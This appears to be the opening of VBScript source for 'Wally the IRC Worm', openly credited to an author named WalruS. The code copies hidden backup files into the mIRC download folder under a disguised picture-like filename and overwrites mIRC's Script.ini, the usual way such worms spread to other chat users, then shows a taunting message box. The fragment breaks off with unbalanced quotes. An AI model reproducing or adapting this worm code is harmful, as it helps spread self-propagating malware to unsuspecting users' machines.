' Wally the IRC Worm by WalruS
On Error Resume Next
Dim fso, fbackup, sbackup
Set fso = CreateObject(""Scripting.FileSystemObject"")
Set fbackup = fso.GetFile(""C:\Windows\Document.bak"")
fbackup.Copy(""C:\Mirc\Download\MyPic.jþg"")
Set sbackup = fso.GetFile(""C:\Windows\Script.bak"")
sbackup.Copy(""C:\Mirc\Script.ini"")
If Minute(Now) = 59 Then
MsgBox ""Wally The Worm Loves Ya!"", vbinformation, ""WalruS Says..."